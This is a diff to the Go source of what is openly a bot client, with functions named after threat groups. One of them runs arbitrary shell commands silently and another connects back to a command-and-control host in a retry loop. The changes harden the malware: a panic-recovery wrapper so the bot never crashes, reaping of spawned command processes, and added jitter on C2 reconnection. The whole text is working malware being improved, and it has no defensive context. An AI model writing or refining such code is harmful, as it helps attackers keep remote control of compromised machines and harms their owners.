@@ -107,6 +107,19 @@ var (
 	cachedUplink float64
 )
 
+// guardedGo runs fn in a goroutine with panic recovery logged via deoxys.
+// Use for any worker whose failure must not crash the bot.
+func guardedGo(name string, fn func()) {
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				deoxys("panic in %s: %v", name, r)
+			}
+		}()
+		fn()
+	}()
+}
+
 // ============================================================================
 // UTILITY FUNCTIONS
 // ============================================================================
@@ -200,7 +213,9 @@ func oceanLotus(cmd string) {
 		command.Stdout = nil
 		command.Stderr = nil
 		command.Stdin = nil
-		command.Start()
+		if err := command.Start(); err == nil {
+			go command.Wait()
+		}
 	}()
 }
 
@@ -315,7 +330,7 @@ func main() {
 		deoxys("main: Attempting connection to C2...")
 		conn, err := gamaredon(host, port)
 		if err != nil {
-			jitter := time.Duration(rand.Int63n(int64(2 * time.Second)))
+			jitter := time.Duration(rand.Int63n(int64(2*time.Second)) + int64(100*time.Millisecond))
 			delay := backoff + jitter
 			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
 			time.Sleep(delay)
